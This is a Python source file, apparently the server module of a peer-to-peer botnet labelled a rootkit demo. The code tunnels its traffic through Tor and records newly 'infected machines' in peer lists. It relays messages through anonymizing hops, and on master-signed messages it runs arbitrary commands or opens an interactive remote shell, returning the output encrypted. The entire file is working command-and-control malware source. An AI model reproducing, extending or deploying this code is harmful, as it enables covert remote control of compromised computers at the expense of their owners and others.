"""Server side of the p2p communication protocol"""

import logging
import threading
import copy
import socket
import socks

from botnet_p2p import ENCODING, BUFFER_SIZE
from botnet_p2p.operations import (
    add_new_infected_machine,
    execute_command,
    select_random_neighbour,
)
from botnet_p2p.message import breakdown_msg, signed_by_master, structure_msg
from botnet_p2p.security import encrypt

logging.basicConfig(level=logging.INFO)


NEW_NODE = 0
COMMAND = 1
UPDATE_FILE = 2
SHELL = 3
EXIT = "exit"

SERVER_HOST = "localhost"
SERVER_PORT = 50000
TOR_SERVER_PORT = 50001
MAX_QUEUE = 4

public_peer_list = "/etc/rootkit_demo/public/peer_list"
private_peer_list = "/etc/rootkit_demo/private/full_peer_list"
public_key_path = "/etc/rootkit_demo/public/source/public_key"

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
socket.socket = socks.socksocket


def start_server():
    logging.info("Starting server ...")
    server_socket = socket.socket()
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(MAX_QUEUE)

    while True:
        client_socket, addr = server_socket.accept()
        client_thread = threading.Thread(target=talk_with_client, args=(client_socket,))
        client_thread.start()


def talk_with_client(client_socket: socket.socket) -> None:
    """ Keep the connection alive with the client and exchange
        messages

        Args:
            client_socket: Socket used to talk with the client
    """
    logging.info("New client connected...")
    coded_msg = client_socket.recv(BUFFER_SIZE)
    msg_info = breakdown_msg(coded_msg)

    num_anonymizers = msg_info["num_anonymizers"]
    msg_type = msg_info["msg_type"]
    msg = msg_info["msg"]

    if num_anonymizers < 0:
        client_socket.close()
    elif num_anonymizers != 0:
        next_hop = create_tunnel(client_socket, msg_info)
        closed_forward = False
        closed_send_back = False
        while not closed_forward and not closed_send_back:
            closed_forward = forward(client_socket, next_hop)
            closed_send_back = send_back(client_socket, next_hop)
    else:
        if msg_type == NEW_NODE and not msg_requires_to_be_signed(msg_type):
            add_new_infected_machine(msg, public_peer_list, private_peer_list)
        else:
            if signed_by_master(coded_msg, public_key_path):
                logging.info("The message was signed by the master")
                if msg_type == COMMAND:
                    output = execute_command(msg)
                    encrypted_msg = encrypt(output, public_key_path)
                    client_socket.send(encrypted_msg)
                    client_socket.close()
                elif msg_type == SHELL:
                    terminal_session(client_socket)
            else:
                logging.info("Someone is trying to break in")


def create_tunnel(client_socket: socket.socket, msg_info: dict) -> socket.socket:
    num_anonymizers = msg_info["num_anonymizers"]
    onion = msg_info["onion"]

    next_hop_node_address = get_next_hop(num_anonymizers, onion)
    updated_msg_info = update_num_anonymizers(msg_info)
    msg_to_forward = structure_msg(updated_msg_info)

    next_hop = socket.socket()
    next_hop.connect((next_hop_node_address, TOR_SERVER_PORT))

    next_hop.send(msg_to_forward)

    return next_hop


def forward(client_socket: socket.socket, next_hop: socket.socket) -> bool:
    msg = client_socket.recv(BUFFER_SIZE)
    if not msg:
        return True
    next_hop.send(msg)
    
    return False

def send_back(client_socket: socket.socket, next_hop: socket.socket) -> bool:
    response = next_hop.recv(BUFFER_SIZE)
    if not response:
        return True
    client_socket.send(response)

    return False


def get_next_hop(num_anonymizers: int, onion: str):
    if num_anonymizers == 1:
        next_hop = onion
    else:
        next_hop = select_random_neighbour(private_peer_list)

    return next_hop


def update_num_anonymizers(msg_info: dict) -> dict:
    msg_info_copy = copy.deepcopy(msg_info)
    msg_info_copy["num_anonymizers"] -= 1

    return msg_info_copy


def msg_requires_to_be_signed(msg_type: int) -> bool:
    return msg_type != NEW_NODE


def terminal_session(client_socket: socket.socket):
    msg = client_socket.recv(BUFFER_SIZE).decode(ENCODING)
    while msg != EXIT:
        output = execute_command(msg)
        encrypted_msg = encrypt(output, public_key_path)
        client_socket.send(encrypted_msg)
        msg = client_socket.recv(BUFFER_SIZE).decode(ENCODING)
    client_socket.close()


start_server()
